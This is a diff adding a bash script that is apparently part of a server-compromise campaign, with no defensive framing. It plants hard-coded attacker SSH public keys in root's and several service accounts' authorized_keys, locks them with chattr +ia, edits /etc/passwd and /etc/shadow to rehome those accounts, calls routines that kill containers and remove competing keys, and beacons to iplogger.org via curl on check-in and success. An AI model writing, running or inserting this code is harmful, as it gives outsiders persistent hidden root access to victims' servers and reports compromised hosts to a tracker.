+		echo "does not exist at all, creating key"
+		mkdir /opt/logger
+		mkdir /opt/logger/.ssh
+		chmod 700 /opt/logger/.ssh
+		touch /opt/logger/.ssh/authorized_keys
+		echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O/7qHc/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y/U1/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv" >>/opt/logger/.ssh/authorized_keys
+		chmod 600 /opt/logger/.ssh/authorized_keys
+		chown -R logger:logger /opt/logger
+		chattr +ia /opt/logger/.ssh/authorized_keys
+		sudo chattr -ia /etc/passwd
+		sudo chattr -ia /etc/shadow
+		sudo usermod -d /opt/logger logger
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+	fi
+}
+
+addsystemsshkey() {
+
+	if [ -f "/opt/system/.ssh/authorized_keys" ]; then
+		echo "authorized_keys file exists in system home directory"
+		if md5sum --status -c - <<<"5ce861ddfec4f14dae5d250418834ef8 /opt/system/.ssh/authorized_keys"; then
+			echo "key is good...nothing to do"
+		else
+			echo "key checksums dont match...replacing"
+			echo "" >>/opt/system/.ssh/authorized_keys
+			chmod 600 /opt/system/.ssh/authorized_keys
+			echo "setting up system user key"
+			mkdir /opt/system
+			mkdir /opt/system/.ssh
+			chmod 700 /opt/system/.ssh
+			touch /opt/system/.ssh/authorized_keys
+			echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O/7qHc/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y/U1/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv" >>/opt/system/.ssh/authorized_keys
+			chmod 600 /opt/system/.ssh/authorized_keys
+			chown -R system:system /opt/system
+			chattr +ia /opt/system/.ssh/authorized_keys
+			chattr -ia /etc/passwd
+			chattr -ia /etc/shadow
+			usermod -d /opt/system system
+			chattr +ia /etc/passwd
+			chattr +ia /etc/shadow
+		fi
+	else
+		echo "does not exist at all, creating key"
+		mkdir /opt/system
+		mkdir /opt/system/.ssh
+		chmod 700 /opt/system/.ssh
+		touch /opt/system/.ssh/authorized_keys
+		echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O/7qHc/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y/U1/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv" >>/opt/system/.ssh/authorized_keys
+		chmod 600 /opt/system/.ssh/authorized_keys
+		chown -R system:system /opt/system
+		chattr +ia /opt/system/.ssh/authorized_keys
+		sudo chattr -ia /etc/passwd
+		sudo chattr -ia /etc/shadow
+		sudo usermod -d /opt/system system
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+	fi
+}
+
+addautoupdatersshkey() {
+
+	if [ -f "/opt/autoupdater/.ssh/authorized_keys" ]; then
+		echo "authorized_keys file exists in autoupdater home directory"
+		if md5sum --status -c - <<<"5ce861ddfec4f14dae5d250418834ef8 /opt/autoupdater/.ssh/authorized_keys"; then
+			echo "key is good...nothing to do"
+		else
+			echo "key checksums dont match...replacing"
+			echo "" >>/opt/autoupdater/.ssh/authorized_keys
+			chmod 600 /opt/autoupdater/.ssh/authorized_keys
+			echo "setting up autoupdater user key"
+			mkdir /opt/autoupdater
+			mkdir /opt/autoupdater/.ssh
+			chmod 700 /opt/autoupdater/.ssh
+			touch /opt/autoupdater/.ssh/authorized_keys
+			echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O/7qHc/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y/U1/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv" >>/opt/autoupdater/.ssh/authorized_keys
+			chmod 600 /opt/autoupdater/.ssh/authorized_keys
+			chown -R autoupdater:autoupdater /opt/autoupdater
+			chattr +ia /opt/autoupdater/.ssh/authorized_keys
+			chattr -ia /etc/passwd
+			chattr -ia /etc/shadow
+			usermod -d /opt/autoupdater autoupdater
+			chattr +ia /etc/passwd
+			chattr +ia /etc/shadow
+		fi
+	else
+		echo "does not exist at all, creating key"
+		mkdir /opt/autoupdater
+		mkdir /opt/autoupdater/.ssh
+		chmod 700 /opt/autoupdater/.ssh
+		touch /opt/autoupdater/.ssh/authorized_keys
+		echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O/7qHc/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y/U1/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv" >>/opt/autoupdater/.ssh/authorized_keys
+		chmod 600 /opt/autoupdater/.ssh/authorized_keys
+		chown -R autoupdater:autoupdater /opt/autoupdater
+		chattr +ia /opt/autoupdater/.ssh/authorized_keys
+		sudo chattr -ia /etc/passwd
+		sudo chattr -ia /etc/shadow
+		sudo usermod -d /opt/autoupdater autoupdater
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+	fi
+}
+
+sshkeysgo() {
+	if [ -f "/root/.ssh/authorized_keys" ]; then
+		echo "authorized_keys file exists in root home directory"
+	else
+		needreset=1
+		mkdir -p /root/.ssh
+		echo "" >>/root/.ssh/authorized_keys
+		chmod 600 /root/.ssh/authorized_keys
+	fi
+
+	cat /root/.ssh/authorized_keys | grep "AAAAB3NzaC1yc2EAAAABJQAAAQEAoL" | grep -v grep >/dev/null
+	if [ $? -eq 0 ]; then
+		echo "Good root Pub Key1 exists in file"
+	else
+		echo "placing root pubkey1 in file"
+		needreset=1
+		mkdir -p /root/.ssh
+		chattr -ia /root/.ssh/authorized_keys
+		chmod 600 /root/.ssh/authorized_keys
+		#echo -e "\n" >> /root/.ssh/authorized_keys;
+		sed -i -e '$a\' /root/.ssh/authorized_keys # This adds \n at the end of the file only if it doesn't already end with a new line. So if you run it twice it will not add another blank line.
+		echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAoLLx+/ZJnMGV2c7T1GGkl1jkyJJ6unLU6nQ7cOo2Qdwp+ommzKhyYEW8HExtgZqzLcGeKksSPU1nvsmoTWJY1Z1qzdx/AOkh5N+yDHan1nIph002u/1ASAmrtEEpg9t2a0iwJPix2KexVMQ/5aVCfd6cJaMc8df9rUwB4U+q6gqPql9RNZXra148/KfOTzs55GlLbJIPK5/KBzBAUEMRCEB4vYehRkY+DxZTrYliVtHgu4nW7W2Q/ffQbftl1gD5DFPDB6BUzkQKH2NYwqB1ntfhmabYg3gpjY+InY2gJGyH37TdqmSDWeyetlNbDl0aGVWc5c3kTdXds4w4w/oFow== bionic" >>/root/.ssh/authorized_keys
+		chattr +ia /root/.ssh/authorized_keys
+	fi
+
+	cat /root/.ssh/authorized_keys | grep "AAAAB3NzaC1yc2EAAAADAQABAAABAQ" | grep -v grep >/dev/null
+	if [ $? -eq 0 ]; then
+		echo "Good root Pub Key2 exists in file"
+	else
+		echo "placing root pubkey2 in file"
+		needreset=1
+		mkdir -p /root/.ssh
+		chattr -ia /root/.ssh/authorized_keys
+		chmod 600 /root/.ssh/authorized_keys
+		#echo -e "\n" >> /root/.ssh/authorized_keys;
+		sed -i -e '$a\' /root/.ssh/authorized_keys # This adds \n at the end of the file only if it doesn't already end with a new line. So if you run it twice it will not add another blank line.
+		echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O/7qHc/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y/U1/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv" >>/root/.ssh/authorized_keys
+		chattr +ia /root/.ssh/authorized_keys
+	fi
+
+}
+
+fixsystem() {
+	sudo chattr -ia /etc/passwd
+	sudo chattr -ia /etc/shadow
+	sudo usermod -d /opt/system system
+	sudo chattr +ia /etc/passwd
+	sudo chattr +ia /etc/shadow
+	chattr -ia /opt/system/.ssh/authorized_keys
+	chmod 700 /opt/system/.ssh
+	chmod 600 /opt/system/.ssh/authorized_keys
+	chown -R system:system /opt/system
+	chattr +ia /opt/system/.ssh/authorized_keys
+}
+
+fixlogger() {
+	sudo chattr -ia /etc/passwd
+	sudo chattr -ia /etc/shadow
+	sudo usermod -d /opt/logger logger
+	sudo chattr +ia /etc/passwd
+	sudo chattr +ia /etc/shadow
+	chattr -ia /opt/logger/.ssh/authorized_keys
+	chmod 700 /opt/logger/.ssh
+	chmod 600 /opt/logger/.ssh/authorized_keys
+	chown -R logger:logger /opt/logger
+	chattr +ia /opt/logger/.ssh/authorized_keys
+}
+
+currenthostcheckin() {
+
+	curl -A currenthost/1.5 -sLo /dev/null https://iplogger.org/1BER87
+
+}
+successgo() {
+	curl -A fczyo-success/1.4 -sLo /dev/null https://iplogger.org/1iw4r7
+	date +"%r"
+}
+
+restartrcd() {
+	systemctl start rc-local
+}
+stopscanner() {
+	#temp stop scanner
+	killall screen
+	#chattr -R -iau /var/tmp/bbb/
+}
+currenthostcheckin
+#restartrcd
+#stopscanner
+killcommondockers
+removefuckboiskeys
+firstthingsfirst
+nameservercheck
+usercheckgo
+#fixgroupalreadyexists
+#usercheckgo
+#resetiptablespid
+croncheckgo
+checkrc
+securitygo
+iptableschecker
+configfilecheck
+filerungo
+#restartdocker
+addloggersshkey
+addsystemsshkey
+sshkeysgo
+addautoupdatersshkey
+#fixsystem
+#fixlogger
+successgo
